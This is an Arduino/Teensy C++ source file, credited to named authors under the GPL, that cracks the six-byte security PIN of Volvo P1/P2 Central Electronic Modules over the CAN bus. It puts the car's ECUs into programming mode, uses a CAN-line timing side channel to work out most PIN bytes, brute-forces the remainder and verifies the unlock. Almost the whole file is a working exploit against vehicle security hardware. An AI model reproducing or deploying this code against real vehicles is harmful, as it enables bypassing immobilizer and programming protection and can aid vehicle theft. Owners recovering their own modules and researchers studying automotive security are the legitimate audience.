/* SPDX-License-Identifier: GPL-3.0 */
/*
 * Copyright (C) 2020, 2021 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *               2020 Christian Molson <christian@cmolabs.org>
 *               2020 Mark Dapoz <md@dapoz.ca>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 */

/* tunable parameters */

#undef  PLATFORM_P1        /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
#define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */

#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */

/* end of tunable parameters */

#include <stdio.h>
#include <FlexCAN_T4.h>

#if !defined(__IMXRT1062__)
#error Unsupported Teensy model, need 4.0
#endif

//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
uint32_t cem_reply_min;
uint32_t cem_reply_avg;
uint32_t cem_reply_max;

#define AVERAGE_DELTA_MIN     -8  /* buckets to look at before the rolling average */
#define AVERAGE_DELTA_MAX     12  /* buckets to look at after the rolling average  */

#define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_250KBPS 250000      /* 250 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;

typedef enum {
  CAN_HS,       /* high-speed bus */
  CAN_LS        /* low-speed bus */
} can_bus_id_t;

/* use the ARM cycle counter as the time-stamp */

#define TSC ARM_DWT_CYCCNT

#define printf Serial.printf

#define CAN_MSG_SIZE    8       /* messages are always 8 bytes */

#define CEM_HS_ECU_ID      0x50
#define CEM_LS_ECU_ID      0x40

#define PIN_LEN         6       /* a PIN has 6 bytes */

unsigned char  shuffle_orders[2][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 } };
unsigned char *shuffle_order;

struct _cem_params {
  unsigned long part_number;
  int baud;
  int shuffle;
} cem_params[] = {
// P1
  { 8690719,  CAN_500KBPS, 0 },
  { 8690720,  CAN_500KBPS, 0 },
  { 8690721,  CAN_500KBPS, 0 },
  { 8690722,  CAN_500KBPS, 0 },
  { 30765471, CAN_500KBPS, 0 },
  { 30728906, CAN_500KBPS, 0 },
  { 30765015, CAN_500KBPS, 0 },
  { 31254317, CAN_500KBPS, 0 },
  { 31327215, CAN_500KBPS, 0 },
  { 31254749, CAN_500KBPS, 0 },
  { 31254903, CAN_500KBPS, 0 },
  { 31296881, CAN_500KBPS, 0 },

// P2 CEM-B (Brick shaped 1999-2004 with K-line)
  { 8645716, CAN_250KBPS, 0 },
  { 8645719, CAN_250KBPS, 0 },
  { 8688434, CAN_250KBPS, 0 },
  { 8688436, CAN_250KBPS, 0 },
  { 8688513, CAN_250KBPS, 0 },
  { 30657629, CAN_250KBPS, 0 },
  { 9494336, CAN_250KBPS, 0 },
  { 9494594, CAN_250KBPS, 0 },
  { 8645171, CAN_250KBPS, 0 },
  { 9452553, CAN_250KBPS, 0 },
  { 8645205, CAN_250KBPS, 0 },
  { 9452596, CAN_250KBPS, 0 },
  { 8602436, CAN_250KBPS, 0 },
  { 9469809, CAN_250KBPS, 0 },
  { 8645200, CAN_250KBPS, 0 },

// P2 CEM-L (L shaped and marked L 2005-2014)
  { 30682981, CAN_500KBPS, 1 },
  { 30682982, CAN_500KBPS, 1 },
  { 30728542, CAN_500KBPS, 1 },
  { 30765149, CAN_500KBPS, 1 },
  { 30765646, CAN_500KBPS, 1 },
  { 30786475, CAN_500KBPS, 1 },
  { 30786889, CAN_500KBPS, 1 },
  { 31282457, CAN_500KBPS, 1 },
  { 31314468, CAN_500KBPS, 1 },
  { 31394158, CAN_500KBPS, 1 },

// P2 CEM-H (L shaped and marked H 2005 - 2007)
  { 30786476, CAN_500KBPS, 1 },
  { 30728539, CAN_500KBPS, 1 },
  { 30682982, CAN_500KBPS, 1 },
  { 30728357, CAN_500KBPS, 1 },
  { 30765148, CAN_500KBPS, 1 },
  { 30765643, CAN_500KBPS, 1 },
  { 30786476, CAN_500KBPS, 1 },
  { 30786890, CAN_500KBPS, 1 },
  { 30795115, CAN_500KBPS, 1 },
  { 31282455, CAN_500KBPS, 1 },
  { 31394157, CAN_500KBPS, 1 },
  { 30786579, CAN_500KBPS, 1 },
};

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq {
  uint8_t  pinValue;    /* value used for the PIN digit */
  uint32_t latency;     /* measured latency */
} sequence_t;

sequence_t sequence[100] = { 0 };

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock (uint32_t freq);

/* forward declarations */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
 *
 * Returns: N/A
 */

void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
{
  CAN_message_t msg;

  if (verbose == true) {
      printf ("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
              bus == CAN_HS ? 'H' : 'L',
              id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
   }

  /* prepare the message to transmit */

  msg.id = id;
  msg.len = 8;
  msg.flags.extended = 1;
  memcpy (msg.buf, data, 8);

  /* send it to the appropriate bus */

  switch (bus) {
    case CAN_HS:
      can_hs.write (msg);
      break;
    case CAN_LS:
      can_ls.write (msg);
      break;
    default:
      break;
  }
}

CAN_message_t can_hs_event_msg;
CAN_message_t can_ls_event_msg;
volatile bool can_hs_event_msg_available = false;
volatile bool can_ls_event_msg_available = false;

/*******************************************************************************
 *
 * canMsgReceive - receive a CAN bus message
 *
 * Note: always processes messages from the high-speed bus
 *
 * Returns: true if a message was available, false otherwise
 */

bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, bool wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool     ret = false;
  volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
  CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);

  do {

    /* call FlexCAN_T4's event handler to process queued messages */

    bus == CAN_HS ? can_hs.events() : can_ls.events();

    /* check if a message was available and process it */

    if (msg_avail) {

      /* process the global buffer set by can_hs.events */

      msg_avail = false;
      canId = msg.id;
      pData = msg.buf;
      ret = true;
    }
  } while (!ret && wait);

  /* no message, just return an error */

  if (!ret)
    return ret;

  /* save data to the caller if they provided buffers */

  if (id != NULL) {
    *id = canId;
  }

  if (data != NULL) {
    memcpy (data, pData, CAN_MSG_SIZE);
  }

  /* print the message we received */

  if (verbose == true) {
    printf ("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            bus == CAN_HS ? 'H' : 'L',
            canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}

/*******************************************************************************
 *
 * binToBcd - convert an 8-bit value to a binary coded decimal value
 *
 * Returns: converted 8-bit BCD value
 */

uint8_t binToBcd (uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************
 *
 * bcdToBin - convert a binary coded decimal value to an 8-bit value
 *
 * Returns: converted 8-bit binary value
 */

uint8_t bcdToBin (uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************
 *
 * profileCemResponse - profile the CEM's response to PIN requests
 *
 * Returns: number of PINs processed per second
 */

uint32_t profileCemResponse (void)
{
  uint8_t  pin[PIN_LEN] = { 0 };
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool     verbose = false;
  uint32_t i;

  cem_reply_avg = 0;

  /* start time in milliseconds */

  start = millis ();

  /* collect the samples */

  for (i = 0; i < 1000; i++) {

    /* average calculation is more reliable using random PIN digits */

    for (int j = 0; j < PIN_LEN; j++)
      pin[j] = binToBcd(random(0, 99));

    /* try and unlock the CEM with the random PIN */

    cemUnlock (pin, NULL, &latency, verbose);

    /* keep a running total of the average latency */

    cem_reply_avg += latency / clockCyclesPerMicrosecond();
  }

  /* end time in milliseconds */

  end = millis ();

  /* calculate the average latency for a single response */

  cem_reply_avg /= 1000;

  cem_reply_min = cem_reply_avg / 2;
  cem_reply_max = cem_reply_avg + cem_reply_min;

  /* number of PINs processed per second */

  rate = 1e6 / (end - start);

  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
  return rate;
}

/*******************************************************************************
 *
 * cemUnlock - attempt to unlock the CEM with the provided PIN
 *
 * Returns: true if the CEM was unlocked, false otherwise
 */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
  uint8_t  reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint32_t start, end, limit;
  uint32_t id;
  uint32_t maxTime = 0;
  bool     replyWait = true;

  /* shuffle the PIN and set it in the request message */

  for (int i = 0; i < PIN_LEN; i++)
    pMsgPin[shuffle_order[i]] = pin[i];

  /* maximum time to collect our samples */

  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
  can_hs_event_msg_available = false;

  /* send the unlock request */
  canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);

  start = TSC;
  while (!can_hs_event_msg_available && TSC < limit) {
    /* if the line is high, the CAN bus is either idle or transmitting a bit */

    if (digitalRead(CAN_L_PIN))
      continue;

    /* the CAN bus isn't idle, it's the start of the next bit */

    end = TSC;

    /* we only need to track the longest time we've seen */

    if (end - start > maxTime)
      maxTime = end - start;
    /* start of the next sample */

    start = end;
  }

  /* default reply is set to indicate a failure */

  memset (reply, 0xff, sizeof(reply));

  /* see if anything came back from the CEM */

  canMsgReceive(CAN_HS, &id, reply, replyWait, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */

  if (latency != NULL) {
    *latency = maxTime;
  }

  /* return PIN used if the caller wants it */

  if (pinUsed != NULL) {
    memcpy (pinUsed, pMsgPin, PIN_LEN);
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

unsigned long ecu_read_part_number(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t  data[CAN_MSG_SIZE] = { 0xcb, id, 0xb9, 0xf0, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = true;
  unsigned long pn = 0;
  int ret;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');

  canMsgSend(bus, 0xffffe, data, verbose);
  do {
again:
    ret = canMsgReceive(bus, &_id, data, true, false);
    if (!ret)
      goto again;
    if (bus == CAN_HS && _id != 0x1000003UL)
      goto again;
    if (bus == CAN_LS && _id != 0x0C00003UL)
      goto again;
    if (data[0] & 0x80) {
      pn *= 100; pn += bcdToBin(data[4]);
      pn *= 100; pn += bcdToBin(data[5]);
      pn *= 100; pn += bcdToBin(data[6]);
      pn *= 100; pn += bcdToBin(data[7]);
    } else if (!(data[0] & 0x40)) {
      pn *= 100; pn += bcdToBin(data[1]);
    }
  } while(!(data[0] & 0x40));

  printf ("Part Number: %lu\n", pn);
  return pn;
}

unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t  data[CAN_MSG_SIZE] = { id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = true;
  unsigned long pn = 0;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');

  canMsgSend(bus, 0xffffe, data, verbose);
  canMsgReceive(bus, &_id, data, true, verbose);

  for (int i = 0; i < 6; i++) {
    pn *= 100;
    pn += bcdToBin(data[2 + i]);
  }

  printf ("Part Number: %lu\n", pn);
  return pn;
}

/*******************************************************************************
 *
 * progModeOn - put all ECUs into programming mode
 *
 * Returns: N/A
 */

void can_prog_mode(can_bus_id_t bus)
{
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint32_t time = 5000;
  uint32_t delayTime = 5;
  bool     verbose = true;

  printf ("Putting all ECUs on CAN_%cS into programming mode.\n", bus == CAN_HS ? 'H' : 'L');

  while(canMsgReceive(bus, NULL, NULL, false, false));

  /* broadcast a series of PROG mode requests */

  while (time > 0) {
    if ((time % 1000) == 0)
      k_line_keep_alive();

    canMsgSend(bus, 0xffffe, data, verbose);

    verbose = false;
    time -= delayTime;
    delay (delayTime);
  }
  while(canMsgReceive(bus, NULL, NULL, false, false));
}

/*******************************************************************************
 *
 * progModeOff - reset all ECUs to get them out of programming mode
 *
 * Returns: N/A
 */

void progModeOff (void)
{
  uint8_t data[CAN_MSG_SIZE] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool    verbose = true;

  printf ("Resetting all ECUs.\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 50; i++) {
    canMsgSend (CAN_HS, 0xffffe, data, verbose);
    canMsgSend (CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    delay (100);
  }
}

/*******************************************************************************
 *
 * seq_max - quicksort comparison function to find highest latency
 *
 * Returns: integer less than zero, zero or greater than zero
 */

int seq_max (const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

/*******************************************************************************
 *
 * crackPinPosition - attempt to find a specific digit in the PIN 
 *
 * Returns: N/A
 */

void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
{
  int len = sizeof(uint32_t) * (cem_reply_max - cem_reply_min);
  uint32_t *histogram = (uint32_t *)malloc(len);
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  uint8_t  pin1;
  uint8_t  pin2;
  uint32_t i;
  uint32_t k;
  int best = 0;
  uint32_t best_prod = 0;

  /* clear collected latencies */

  memset (sequence, 0, sizeof(sequence));

  printf("                   us: ");
  for (i = cem_reply_avg + AVERAGE_DELTA_MIN; i < cem_reply_avg + AVERAGE_DELTA_MAX; i++)
    printf("%5d ", i);
  printf("\n");

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < 100; pin1++) {
    /* set PIN digit */

    pin[pos] = binToBcd (pin1);

    /* print a progress message for each PIN digit we're processing */

    printf ("[ ");

    /* show numerial values for the known digits */

    for (i=0; i <= pos; i++) {
      printf ("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN) {
      printf ("-- ");
      i++;
    }

    printf ("]: ");

    /* clear histogram data for the new PIN digit */

    memset (histogram, 0, len);

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++) {

      /* set PIN digit */

      pin[pos + 1] = binToBcd (pin2);

      /* collect latency measurements the PIN pair */

      for (uint32_t j = 0; j < SAMPLES; j++) {

        /* iterate the next PIN digit (third digit) */

        pin[pos + 2] = binToBcd ((uint8_t)j);

        /* try and unlock and measure the latency */

        cemUnlock (pin, NULL, &latency, verbose);

        /* calculate the index into the historgram */

        uint32_t idx = latency / clockCyclesPerMicrosecond();

        if (idx < cem_reply_min)
          idx = cem_reply_min;

        if (idx >= cem_reply_max)
          idx = cem_reply_max - 1;

        idx -= cem_reply_min;
        /* bump the count for this latency */

        histogram[idx]++;
      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0;
    pin[pos + 2] = 0;

    /* clear statistical values we're calculating */

    prod = 0;
    sum  = 0;

    /* loop over the histogram values */

    for (k = cem_reply_avg + AVERAGE_DELTA_MIN; k < cem_reply_avg + AVERAGE_DELTA_MAX; k++) {
      int l = k - cem_reply_min;
      printf ("% 5u ", histogram[l]);

      /* calculate weighted count and total of all entries */
      prod += histogram[l] * l;
      sum  += histogram[l];
    }

    /* weighted average */

    printf (": % 10u; best %02x is %s than %02x by %d\n", prod, binToBcd(best), ((int)best_prod - (int)prod) > 0 ? "greater" : "less", pin[pos], abs(best_prod - prod));

    if (best_prod < prod) {
      best_prod = prod;
      best = pin1;
    }

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;


#if defined(DUMP_BUCKETS)
    printf ("Average latency: %u\n", cem_reply_avg);

    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
      if (histogram[k] != 0) {
        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
      }
    }
#endif

  }

  /* sort the collected sequence of latencies */

  qsort (sequence, 100, sizeof(sequence_t), seq_max);

  /* print the top 25 latencies and their PIN value */

  for (uint32_t i = 0; i < 25; i++) {
    printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }

  /* choose the PIN value that has the highest latency */

  printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);

  /* set the digit in the overall PIN */

  pin[pos] = sequence[0].pinValue;
  pin[pos + 1] = 0;
  free(histogram);
}

/*******************************************************************************
 *
 * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
 *
 * Returns: N/A
 */

void cemCrackPin (uint32_t maxBytes, bool verbose)
{
  uint8_t  pin[PIN_LEN];
  uint8_t  pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate;
  uint32_t remainingBytes;
  bool     cracked = false;
  uint32_t i;

  printf ("Calculating bytes 0-%u\n", maxBytes - 1);

  /* profile the CEM to see how fast it can process requests */

  crackRate = profileCemResponse ();

  /* start time */

  start = millis ();

  /* set the PIN to all zeros */

  memset (pin, 0, sizeof(pin));

  /* try and crack each PIN position */

  for (uint32_t i = 0; i < maxBytes; i++) {
    crackPinPosition (pin, i, verbose);
  }

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */

  printf ("Candidate PIN ");

  /* show numerial values for the known digits */

  for (i=0; i < maxBytes; i++) {
    printf ("0x%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */

  while (i < PIN_LEN) {
    printf ("-- ");
    i++;
  }

  printf (": brute forcing bytes %u to %u (%u bytes), will take up to %u seconds\n",
          maxBytes, PIN_LEN - 1, remainingBytes,
          (uint32_t)(pow (100, remainingBytes) / crackRate));

  /* 5% of the remaining PINs to try */

  percent_5 = pow (100, (remainingBytes))/20;

  printf ("Progress: ");

  /*
   * Iterate for each of the remaining PIN bytes.
   * Each byte has a value 0-99 so we iterare for 100^remainingBytes values
   */

  for (i = 0; i < pow (100, (remainingBytes)); i++) {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (uint32_t j = maxBytes; j < PIN_LEN; j++) {
      pin[j] = binToBcd (pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock (pin, pinUsed, NULL, verbose)) {

      /* the PIN worked, print it and terminate the search */

      printf ("done\n");
      printf ("\nfound PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x",
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);

      cracked = true;
      break;
    }

    /* print a periodic progress message */

    if ((i % percent_5) == 0) {
      printf ("%u%%..", percent * 5);
      percent++;
    }
  }

  /* print execution summary */

  end = millis ();
  printf ("\nPIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);

  /* validate the PIN if we were able to crack it */

  if (cracked == true) {

    uint8_t data[CAN_MSG_SIZE];
    uint32_t can_id = 0;

    printf ("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_HS_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset (data, 0, sizeof(data));

    canMsgReceive(CAN_HS, &can_id, data, true, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
      printf ("PIN verified.\n");
    } else {
      printf ("PIN verification failed!\n");
    }
  }

  printf ("done\n");
}

void can_ls_init(int baud)
{
  can_ls.begin();
  can_ls.setBaudRate(baud);
  can_ls.enableFIFO();
  can_ls.enableFIFOInterrupt();
  can_ls.setFIFOFilter(ACCEPT_ALL);
  printf ("CAN low-speed init done.\n");
}

void can_hs_init(int baud)
{
  can_hs.begin();
  can_hs.setBaudRate(baud);
  can_hs.enableFIFO();
  can_hs.enableFIFOInterrupt();
  can_hs.setFIFOFilter(ACCEPT_ALL);
  printf ("CAN high-speed init done.\n");
}

/*******************************************************************************
 *
 * ext_output1 - called by FlexCAN_T4's receive interrupt handler
 *
 * Returns: N/A
 */

void ext_output1(const CAN_message_t &msg)
{
  if (msg.bus == 1) {
    can_hs_event_msg = msg;
    can_hs_event_msg_available = true;
  } else {
    can_ls_event_msg = msg;
    can_ls_event_msg_available = true;
  }
}

void k_line_keep_alive()
{
  unsigned char msg[] = { 0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c };

  Serial3.write(msg, sizeof(msg));
}

bool find_cem_params(unsigned long pn, struct _cem_params *p)
{
  int i;
  int n = sizeof(cem_params) / sizeof(struct _cem_params);

  printf("Search P/N %lu in %d known CEMs\n", pn, n);
  for (i = 0; i < n; i++) {
    if (cem_params[i].part_number == pn) {
      *p = cem_params[i];
      return true;
    }
  }
  return false;
}

bool initialized = false;

/*******************************************************************************
 *
 * setup - Arduino entry point for hardware configuration
 *
 * Returns: N/A
 */

void setup (void)
{
  /* set up the serial port */

  Serial.begin(115200);
  Serial3.begin(10800); /* K-Line */

  delay (3000);

  /* enable the time stamp counter */

  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;

  /* set up the pin for sampling the CAN bus */

  pinMode (CAN_L_PIN, INPUT_PULLUP);

//  set_arm_clock (180000000);

  printf ("CPU Maximum Frequency:   %u\n", F_CPU);
  printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
  printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
  printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
  printf ("Number of samples:       %u\n", SAMPLES);

  long pn;

  can_hs.begin();
  k_line_keep_alive();
  can_ls_init(CAN_125KBPS);
  delay(1000);
  k_line_keep_alive();
  pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);

//while (true) { k_line_keep_alive(); delay(1000); }

  struct _cem_params hs_params;
  if (!find_cem_params(pn, &hs_params)) {
    printf("Unknown CEM part number %lu. Don't know what to do.\n", pn);
    return;
  }

  shuffle_order = shuffle_orders[hs_params.shuffle];
  printf("CAN HS baud rate: %d\n", hs_params.baud);
  printf("PIN shuffle order: %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);
  can_hs_init(hs_params.baud);
  can_prog_mode(CAN_HS);
  pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
  initialized = true;
  printf ("Initialization done.\n\n");
}

/*******************************************************************************
 *
 * loop - Arduino main loop
 *
 * Returns: N/A
 */

void loop (void)
{
  bool verbose = false;

  if (initialized)
    cemCrackPin (CALC_BYTES, verbose);

  /* exit ECU programming mode */

  progModeOff ();

  /* all done, stop */

  for (;;) {
  }
}
